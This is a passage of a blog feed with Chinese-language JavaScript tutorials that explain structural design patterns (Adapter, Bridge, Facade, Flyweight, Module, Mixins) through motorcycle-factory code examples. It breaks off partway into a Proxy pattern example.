        <content type="html"><![CDATA[<p>上一篇文章介紹過了<a href="https://linyencheng.github.io/2023/03/29/js-pattern/js-structure-pattern-for-programming-syntax/">優化語法</a>的四種結構型設計模式，這篇文章主要會從優化程式碼結構的幾種 Pattern 開始介紹</p><p>接下來會繼續從優化程式碼結構的四種結構型設計模式開始介紹</p><ul><li>Adapter Pattern</li><li>Bridge Pattern</li><li>Facade Pattern</li><li>Flyweight Pattern</li></ul><p>Design Patterns 依照目的分成三群：</p><ul><li><a href="https://linyencheng.github.io/2023/02/25/js-pattern/js-creational-pattern/">Creational Patterns 創建型</a></li><li>Structural Patterns 結構型，結構型設計模式根據實際情況會分成三種:<ul><li><a href="https://linyencheng.github.io/2023/03/29/js-pattern/js-structure-pattern-for-programming-syntax/">優化語法</a></li><li><a href="https://linyencheng.github.io/2023/04/02/js-pattern/js-structure-pattern-for-code/">優化程式碼結構</a></li><li><a href="https://linyencheng.github.io/2023/05/30/js-pattern/js-structure-pattern-for-project/">優化專案結構</a></li></ul></li><li><a href="https://linyencheng.github.io/2023/06/30/js-pattern/js-behavioral-pattern/">Behavioural Patterns 行為型</a></li></ul><h2 id="Adapter-Pattern"><a href="#Adapter-Pattern" class="headerlink" title="Adapter Pattern"></a>Adapter Pattern</h2><p>在這個範例中，有兩個介面</p><ul><li>MotorcycleFactory 代表原有的機車工廠</li><li>NewMotorcycleFactory 代表新的機車工廠</li></ul><p>新的機車工廠的製造方式不同 (produce -&gt; create)，所以透過 NewMotorcycleFactoryAdapter 多轉一層，讓原有的程式在不改變寫法的情況下，可以使用新的機車工廠物件 (新的方法) 去製造機車。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 機車工廠原有的介面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MotorcycleFactory</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">produce</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> 生產了一輛機車`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新增的介面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NewMotorcycleFactory</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">create</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> 創建了一輛機車`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Adapter</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NewMotorcycleFactoryAdapter</span> <span class="keyword">extends</span> <span class="title class_ inherited__">MotorcycleFactory</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">newMotorcycleFactory</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(newMotorcycleFactory.<span class="property">name</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">newMotorcycleFactory</span> = newMotorcycleFactory;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">produce</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">newMotorcycleFactory</span>.<span class="title function_">create</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">let</span> newMotorcycleFactory = <span class="keyword">new</span> <span class="title class_">NewMotorcycleFactory</span>(<span class="string">&quot;新機車工廠&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> adapter = <span class="keyword">new</span> <span class="title class_">NewMotorcycleFactoryAdapter</span>(newMotorcycleFactory);</span><br><span class="line"></span><br><span class="line">adapter.<span class="title function_">produce</span>();</span><br></pre></td></tr></table></figure><h2 id="Bridge-Pattern"><a href="#Bridge-Pattern" class="headerlink" title="Bridge Pattern"></a>Bridge Pattern</h2><p>假設你想要生產機車，會需要像是引擎跟底盤等等屬性。</p><p>當如果要增加引擎、底盤的種類來組出新款機車，就需要 Bridge pattern，讓機車實作後只需要呼叫 Bridge 介面的方法即可。</p><p>總結來說，Bridge pattern 可以幫助你在物件的實作和介面之間建立 Bridge 關係，讓你可以更靈活地應對系統的變化。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SportBikeEngine</span> &#123;</span><br><span class="line">  <span class="title function_">start</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Starting sport bike engine...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CruiserEngine</span> &#123;</span><br><span class="line">  <span class="title function_">start</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Starting cruiser engine...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SportBikeChassis</span> &#123;</span><br><span class="line">  <span class="title function_">ride</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Riding sport bike chassis...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CruiserChassis</span> &#123;</span><br><span class="line">  <span class="title function_">ride</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Riding cruiser chassis...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Motorcycle Abstraction</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">brand, engineType, chassisType</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">brand</span> = brand;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">engineType</span> = engineType;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chassisType</span> = chassisType;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">start</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">engineType</span>.<span class="title function_">start</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">ride</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chassisType</span>.<span class="title function_">ride</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BridgeBike</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">brand, engineType, chassisType</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(brand, engineType, chassisType);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">riding</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">ride</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Usage</span></span><br><span class="line"><span class="keyword">const</span> sportBikeEngine = <span class="keyword">new</span> <span class="title class_">SportBikeEngine</span>();</span><br><span class="line"><span class="keyword">const</span> cruiserEngine = <span class="keyword">new</span> <span class="title class_">CruiserEngine</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sportBikeChassis = <span class="keyword">new</span> <span class="title class_">SportBikeChassis</span>();</span><br><span class="line"><span class="keyword">const</span> cruiserChassis = <span class="keyword">new</span> <span class="title class_">CruiserChassis</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sportBike = <span class="keyword">new</span> <span class="title class_">BridgeBike</span>(<span class="string">&quot;Honda&quot;</span>, sportBikeEngine, sportBikeChassis);</span><br><span class="line"><span class="keyword">const</span> cruiser = <span class="keyword">new</span> <span class="title class_">BridgeBike</span>(<span class="string">&quot;SYM&quot;</span>, cruiserEngine, cruiserChassis);</span><br><span class="line"><span class="keyword">const</span> mixedMotor = <span class="keyword">new</span> <span class="title class_">BridgeBike</span>(<span class="string">&quot;Custom&quot;</span>, sportBikeEngine, cruiserChassis);</span><br><span class="line"></span><br><span class="line">sportBike.<span class="title function_">start</span>();</span><br><span class="line">sportBike.<span class="title function_">riding</span>();</span><br><span class="line"></span><br><span class="line">cruiser.<span class="title function_">start</span>();</span><br><span class="line">cruiser.<span class="title function_">riding</span>();</span><br><span class="line"></span><br><span class="line">mixedMotor.<span class="title function_">start</span>();</span><br><span class="line">mixedMotor.<span class="title function_">riding</span>();</span><br></pre></td></tr></table></figure><h2 id="Facade-Pattern"><a href="#Facade-Pattern" class="headerlink" title="Facade Pattern"></a>Facade Pattern</h2><p>你各位知道嗎?! React 最常用的竟然用的就是 Facade Pattern!</p><p>是把一堆難懂的東西，包裝成一個簡單易懂的東西，讓使用者用起來更方便。</p><p>以單純的 JavaScript 範例來說，Google Map API 就是一個 Facade Pattern，透過一個 Map 物件把複雜的圖層與地理資訊操作封裝起來。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initMap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  map = <span class="keyword">new</span> google.<span class="property">maps</span>.<span class="title class_">Map</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;map&quot;</span>), &#123;</span><br><span class="line">    <span class="attr">center</span>: &#123; <span class="attr">lat</span>: -<span class="number">34.397</span>, <span class="attr">lng</span>: <span class="number">150.644</span> &#125;,</span><br><span class="line">    <span class="attr">zoom</span>: <span class="number">8</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">initMap</span> = initMap;</span><br></pre></td></tr></table></figure><p>React 的元件跟 Hooks 也是異曲同工之妙，<code>useSWR</code> 來說就封裝了 data、error、loading 的邏輯。</p><p>而元件則是把實作都包裝在元件中，我們只需要關注傳入的 props 就可以運用元件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; data, error, isLoading &#125; = <span class="title function_">useSWR</span>(<span class="string">&quot;/api/user&quot;</span>, fetcher);</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">BreadCrumb</span> <span class="attr">model</span>=<span class="string">&#123;items&#125;</span> <span class="attr">home</span>=<span class="string">&#123;home&#125;</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><h2 id="Flyweight-Pattern"><a href="#Flyweight-Pattern" class="headerlink" title="Flyweight Pattern"></a>Flyweight Pattern</h2><p>當需要大量創建相同或類似的物件時，可以使用 Flyweight Pattern 模式，讓這些物件共用一個記憶體空間，從而減少記憶體的使用量。</p><p>其實也就是之前提到的單體模式的延伸</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">brand, model, color</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (instance) <span class="keyword">return</span> instance;</span><br><span class="line">    <span class="keyword">if</span> (!instance) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">brand</span> = brand;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">model</span> = model;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">color</span> = color;</span><br><span class="line">      instance = <span class="variable language_">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以進一步的建立機車工廠來做一個 Flyweight Pattern</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MotorcycleFactory</span> = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> motorcyclePool = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getMotorcycle</span>(<span class="params">brand, model, color</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> key = brand + model + color;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!motorcyclePool[key]) &#123;</span><br><span class="line">      motorcyclePool[key] = <span class="keyword">new</span> <span class="title class_">Motorcycle</span>(brand, model, color);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> motorcyclePool[key];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">getMotorcycle</span>: getMotorcycle,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> motorcycle1 = <span class="title class_">MotorcycleFactory</span>.<span class="title function_">getMotorcycle</span>(<span class="string">&quot;Yamaha&quot;</span>, <span class="string">&quot;NMAX&quot;</span>, <span class="string">&quot;Black&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> motorcycle2 = <span class="title class_">MotorcycleFactory</span>.<span class="title function_">getMotorcycle</span>(<span class="string">&quot;Honda&quot;</span>, <span class="string">&quot;PCX&quot;</span>, <span class="string">&quot;Red&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> motorcycle3 = <span class="title class_">MotorcycleFactory</span>.<span class="title function_">getMotorcycle</span>(<span class="string">&quot;Yamaha&quot;</span>, <span class="string">&quot;NMAX&quot;</span>, <span class="string">&quot;Black&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Structural Pattern For Program Syntax</title>
      <link href="/2023/03/29/js-pattern/js-structure-pattern-for-programming-syntax/"/>
      <url>/2023/03/29/js-pattern/js-structure-pattern-for-programming-syntax/</url>
      
        <content type="html"><![CDATA[<blockquote><p>你知道 React 本身也有使用設計模式嗎? 其中用到最多的又會是哪一種?</p></blockquote><p>以 React 架構上來說，因為是 Component Based 的函式庫，最常用到的會是 Module Pattern，而實現 Component 的實作則是 Facade Pattern。</p><p>上一篇文章介紹過了創建型的 Pattern，這篇文章會繼續開箱結構型，結構型可以幫助我們更好的去組織程式碼，避免隨著專案規模增長找到程式碼的難度也越來越高的現象，接下來會先從優化語法的四種結構型設計模式開始介紹</p><ul><li>Module Pattern</li><li>Mixins Pattern</li><li>Proxy Pattern</li><li>Decorator Pattern</li></ul><p>Design Patterns 依照目的分成三群：</p><ul><li><a href="https://linyencheng.github.io/2023/02/25/js-pattern/js-creational-pattern/">Creational Patterns 創建型</a></li><li>Structural Patterns 結構型，結構型設計模式根據實際情況會分成三種:<ul><li><a href="https://linyencheng.github.io/2023/03/29/js-pattern/js-structure-pattern-for-programming-syntax/">優化語法</a></li><li><a href="https://linyencheng.github.io/2023/04/02/js-pattern/js-structure-pattern-for-code/">優化程式碼結構</a></li><li><a href="https://linyencheng.github.io/2023/05/30/js-pattern/js-structure-pattern-for-project/">優化專案結構</a></li></ul></li><li><a href="https://linyencheng.github.io/2023/06/30/js-pattern/js-behavioral-pattern/">Behavioural Patterns 行為型</a></li></ul><h2 id="Module-Pattern"><a href="#Module-Pattern" class="headerlink" title="Module Pattern"></a>Module Pattern</h2><p>Module pattern 是一種設計模式，主要用於封裝功能，可以將變數和函數進行分組並且限制在一個私有作用域，只將公共介面揭露出來，減少和全域變數、函式發生衝突。</p><p>以下是一個簡單的 Module Pattern 範例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleCounter = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">getValue</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> count;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">increment</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> ++count;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">reset</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reset:&quot;</span> + count);</span><br><span class="line">      count = <span class="number">0</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">moduleCounter.<span class="title function_">getValue</span>();</span><br><span class="line">moduleCounter.<span class="title function_">increment</span>();</span><br><span class="line">moduleCounter.<span class="title function_">reset</span>();</span><br></pre></td></tr></table></figure><p>在這個範例中，moduleCounter 是一個封裝私有變數和函數的模組。</p><ul><li>count 是私有變數，無法從模組外部存取</li><li>getValue 是一個公開的函式用來存取私有的變數</li></ul><p>在 ES6 中，JavaScript 提供了一種內建的模組系統，可以通過 export 和 import 關鍵字來處理。</p><p>這種模組系統使得 JavaScript 模組化開發更加容易，提高了可讀性和可維護性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// counter.js</span></span><br><span class="line"><span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getValue</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> ++count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">reset</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reset:&quot;</span> + count);</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getValue, increment, reset &#125; <span class="keyword">from</span> <span class="string">&quot;./counter.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getValue</span>());</span><br></pre></td></tr></table></figure><h2 id="Mixins-Pattern"><a href="#Mixins-Pattern" class="headerlink" title="Mixins Pattern"></a>Mixins Pattern</h2><p>Mixins Pattern 像是汽機車改裝零件，在本體不被修改的情況下能夠優化一些功能。</p><p>所以以 JavaScript 來說，透過 prototype 的特性可以在不修改現有程式碼的情況下，將物件添加新的功能或屬性。</p><p>Mixins Pattern 將多個物件的功能和屬性混合在一起，建立一個新的物件，這個新的物件包含了所有混合在一起的功能和屬性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定義基礎 Class 一台機車包含牌照及 CC 數</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">license, volume</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">license</span> = license;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">volume</span> = volume;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  2. 定義 Sym 工廠並且定義 createMotor function</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MotorFactory</span> &#123;</span><br><span class="line">  <span class="title function_">createMotor</span>(<span class="params">&#123; volume &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (volume &lt;= <span class="number">50</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Motorcycle</span>(<span class="string">&quot;green&quot;</span>, volume);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (volume &lt; <span class="number">150</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Motorcycle</span>(<span class="string">&quot;white&quot;</span>, volume);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 定義 mixins</span></span><br><span class="line"><span class="keyword">const</span> motorComponentMixins = &#123;</span><br><span class="line">  <span class="title function_">makeHornSound</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.license&#125;</span> ba ba`</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Motorcycle</span>.<span class="property"><span class="keyword">prototype</span></span>, motorComponentMixins);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立工廠物件</span></span><br><span class="line"><span class="keyword">const</span> motorFactory = <span class="keyword">new</span> <span class="title class_">MotorFactory</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 透過工廠物件生產機車</span></span><br><span class="line"><span class="keyword">const</span> motorGreenLicense = motorFactory.<span class="title function_">createMotor</span>(&#123; <span class="attr">volume</span>: <span class="number">50</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> motorWhiteLicense = motorFactory.<span class="title function_">createMotor</span>(&#123; <span class="attr">volume</span>: <span class="number">125</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(motorGreenLicense);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(motorWhiteLicense);</span><br><span class="line"></span><br><span class="line">motorGreenLicense.<span class="title function_">makeHornSound</span>();</span><br></pre></td></tr></table></figure><h2 id="Proxy-Pattern"><a href="#Proxy-Pattern" class="headerlink" title="Proxy Pattern"></a>Proxy Pattern</h2><p>Proxy Pattern 可以監控和控制對一個物件的訪問。</p><p>可以把它想像成一個代理人，當有人要訪問這個物件時，代理人可以介入並決定是否允許進行操作以及該如何處理。</p><p>參考資料: <a href="https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Global_Objects/Proxy">https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Global_Objects/Proxy</a></p><p>舉個例子，假設我們有一個物件 person，裡面有一個屬性 age，並且在 age 屬性加上一些控制</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span 